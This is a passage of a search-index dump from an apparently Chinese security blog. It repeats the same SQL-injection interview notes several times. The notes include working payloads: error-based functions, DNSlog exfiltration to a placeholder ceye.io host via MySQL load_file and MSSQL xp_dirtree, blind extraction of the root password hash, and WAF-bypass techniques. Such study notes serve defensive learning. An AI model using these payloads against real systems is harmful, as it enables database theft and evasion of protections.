8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#01-sql注入漏洞"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1注入点的不同分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2提交方式的不同分类"},{"categories":["hvv"],"content":"\r01-SQL注入漏洞\r1.原理SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。 2.分类\r(1)注入点的不同分类●数字类型的注入 ●字符串类型的注入 (2)提交方式的不同分类●GET注入 ●POST注入 ●COOKIE注入 ●HTTP注入 (3)获取信息的方式不同分类●基于布尔的盲注 如果数据库中可以查到相应的数据，页面会正常显示，反之异常。 ●基于时间的盲注 无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。 ●基于报错的注入 ●二次注入 ●宽字节注入 有些waf会在我们的提交数据前会被加入\\，\\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义 ●盲注和延时注入的共同点？ 都是一个字符一个字符的判断 3.盲注原理将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 4.一个登录框怎么测试 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 